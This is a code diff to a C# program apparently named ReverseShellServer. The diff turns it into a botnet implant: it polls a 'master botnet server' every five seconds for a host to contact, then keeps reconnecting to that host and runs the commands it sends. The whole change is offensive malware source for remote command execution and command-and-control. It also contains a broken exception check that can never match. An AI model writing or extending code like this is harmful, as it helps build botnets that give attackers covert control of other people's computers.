@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Threading;
+using ServerBotnet;
 using ServerCommands;
 using Shared;
 
@@ -11,6 +12,24 @@ namespace ReverseShellServer
         internal ServerNetworkManager networkManager { get; set; }
 
         internal ServerCommandsManager commandsManager { get; set; }
+
+        /// <summary>
+        /// Time in ms to wait for between each server contact
+        /// </summary>
+        readonly int retryDelay = 5000;
+
+        /// <summary>
+        /// Number of times the server will try to connect to the client
+        /// </summary>
+        int _connectionRetryCount;
+
+        int connectionRetryCount
+        {
+            get => _connectionRetryCount;
+
+            // If incrementation, reset value
+            set => _connectionRetryCount = value > _connectionRetryCount ? 10 : value;
+        }
 
 
         /// <summary>
@@ -29,18 +48,40 @@ namespace ReverseShellServer
 
 
         /// <summary>
-        /// Entry point of the server manager, indefinitely run the server method,
-        /// if the connection stops, retry after the given delay
+        /// Entry point of the server manager, call the master botnet server to acquire instructions.
+        /// This process occures every {retryDelay} ms.
+        /// If it acquires a remote host to connect to, call the RunServer() method
         /// </summary>
-        /// <param name="remoteAdress">Remote end to connect to</param>
-        /// <param name="remotePort">Remote end's port to connect to</param>
-        /// <param name="retryDelay">Time in ms to wait for between each connection attempt</param>
-        public void Start(string remoteAdress, int remotePort, int retryDelay)
+        public void Start()
         {
             while (true)
             {
-                RunServer(remoteAdress, remotePort);
-                Thread.Sleep(retryDelay);           //Wait for the given time and try again
+                var connectionSettings = BotnetManager.Process();
+                if (connectionSettings != null)
+                {
+                    // Reset retry count
+                    connectionRetryCount++;
+
+                    while (connectionRetryCount != 0)
+                    {
+                        try
+                        {
+                            RunServer(connectionSettings.Item1, connectionSettings.Item2);
+                        }
+                        catch (Exception)
+                        {
+                            // Exceptions thrown trigger the network manager cleanup
+                            Cleanup();
+
+                            // The client asked to stop the connection, break from the connection loop
+                            if(typeof(Exception) == typeof(ExitException)) break;
+
+                            connectionRetryCount--;
+                        }
+                    }
+                }
+
+                Thread.Sleep(retryDelay);
             }
         }
 
@@ -55,9 +96,12 @@ namespace ReverseShellServer
         {
             if (!networkManager.ConnectToClient(remoteAdress, remotePort))
             {
-                // the connection attempt wasn't successfull
+                // The connection attempt wasn't successfull
                 return;
             }
+
+            // Reset retry count
+            connectionRetryCount++;
 
             // While there is no exception, wait for incoming data and process it
             while (true)
@@ -70,10 +114,9 @@ namespace ReverseShellServer
                         continue;
                     ProcessCommand(incomingData);
                 }
-                catch (Exception)
+                catch (StopServerException)
                 {
-                    Cleanup();
-                    break;
+                    StopServer();
                 }
             }
         }
@@ -95,17 +138,9 @@ namespace ReverseShellServer
             }
 
             var command = commandsManager.GetCommandByName(commandName);
-            if (command != null)
-            {
-                try
-                {
-                    command.Process(arguments);
-                }
-                catch (StopServerException)
-                {
-                    StopServer();
-                }
-            }
+
+            // Exceptions are caught and treated by the calling method
+            command?.Process(arguments);
         }
 
 
